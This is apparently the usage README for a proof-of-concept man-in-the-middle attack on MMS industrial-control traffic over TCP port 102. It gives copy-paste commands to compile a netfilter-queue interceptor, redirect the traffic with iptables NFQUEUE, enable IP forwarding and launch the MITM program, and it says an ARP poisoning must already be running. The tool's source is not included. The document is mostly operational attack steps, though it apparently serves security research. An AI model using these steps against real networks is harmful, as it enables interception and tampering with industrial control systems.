|------------------------------------------------|
|                                                |
|                   !! USAGE !!                  |
|               !! FULL AUTOMATIC !!             |
|                                                |
|------------------------------------------------|

run:
  1) chmod +x setup.sh restore.sh
  2) ./setup.sh
  3) follow instructions printed by the script

when the PoC of the attack is done run:
  1) ./restore.sh

__________________________________________________


|------------------------------------------------|
|                                                |
|              !! STEP BY STEP !!                |
|                                                |
|------------------------------------------------|

If you prefer ctrl-C ctrl-V insted of scripting:

###### To compile ######

g++ -o mms_nfq mms_nfq.cpp -lnetfilter_queue

###### To activate NFQUEUE ######

iptables -t mangle -A POSTROUTING -p tcp --sport 102 -j NFQUEUE

###### To activate forwarding ######

sysctl -w net.ipv4.ip_forward=1

###### To start the mitm software ######

./mms_nfq

BE CAREFUL: the software works only if an arpoisoning is in progress...

###### when the PoC of the attack is done ######

sysctl -w net.ipv4.ip_forward=0 && iptables -F
